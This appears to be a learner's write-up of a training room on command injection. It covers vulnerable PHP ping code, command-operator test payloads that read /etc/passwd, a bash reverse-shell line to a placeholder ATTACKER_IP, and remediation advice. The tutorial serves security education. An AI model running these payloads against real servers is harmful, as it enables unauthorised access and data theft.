# Command Injection

Command Injection is a **web application vulnerability that allows attackers to execute operating system commands on the server** running the application. It occurs when **user input is passed directly into system commands without proper validation or sanitization**. Because many backend applications rely on system commands to perform tasks such as network checks or file operations, attackers can manipulate these inputs to execute additional malicious commands.

Injection vulnerabilities like this are consistently listed in the **OWASP Top 10**, and security reports such as the **Contrast Security AppSec Intelligence Report** have highlighted command injection as one of the most common and dangerous vulnerabilities affecting web applications.

---

## Understanding Command Injection

Command injection typically occurs when an application constructs a shell command using user input.

Example vulnerable code:
```php
system("ping " . $_GET['ip']);

If an attacker supplies malicious input, the command executed on the server changes.

Example input: 127.0.0.1; whoami

Executed command: ping 127.0.0.1; whoami

The attacker successfully executes an additional command on the server.

### Discovering Command Injection

Security testers look for features that interact with the operating system, such as:
Ping or traceroute utilities
File management functions
System monitoring tools
Backup scripts

Example vulnerable input field:
Enter a domain to ping: example.com

Test payload: example.com; whoami

If the application returns the system username, command execution is confirmed.

Common command operators used for testing:
Operator	Purpose
;	Run another command
&&	Run next command if first succeeds
`	`
&	Execute command in background

Example payloads:

127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
Exploiting Command Injection

Once command execution is confirmed, attackers attempt to gather system information and sensitive data.

Basic enumeration:
whoami
id
uname -a

Example attack payload: 127.0.0.1; cat /etc/passwd

This may reveal system users and other sensitive information.

Windows payload examples: 127.0.0.1 & whoami
127.0.0.1 & dir

Advanced attackers may attempt to gain a reverse shell.

Example listener: nc -lvnp 4444

Example payload: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

This provides remote command-line access to the compromised server.

# Security Impact

Command injection vulnerabilities can lead to severe consequences:
Remote command execution
Server compromise
Sensitive data exposure
Privilege escalation
Malware installation

Because attackers interact directly with the server operating system, this vulnerability can result in complete system takeover.

## Remediation and Prevention

Preventing command injection requires secure coding and strict input handling.
Input Validation
Validate and restrict user input to expected formats.

Example allow-list:
Only allow numbers and dots for IP addresses
Avoid Shell Commands

Use secure libraries instead of system commands when possible.

Unsafe example:

system("ping " . $ip);

Safer example:
subprocess.run(["ping", ip])
Escape User Input

If system commands must be used, escape input properly.

Example:
escapeshellarg($input);
Principle of Least Privilege

Applications should run with minimal system permissions to reduce potential damage if exploitation occurs.

Command injection occurs when untrusted input is executed as part of an operating system command. Attackers exploit this flaw using shell operators to inject additional commands and gain control over the server. Detecting this vulnerability involves testing input fields with command operators and observing server responses. Secure development practices such as input validation, avoiding shell execution, and limiting privileges are essential to prevent command injection attacks.

Room Completed: Command Injection
Focus Area: Web Application Security, Injection Vulnerabilities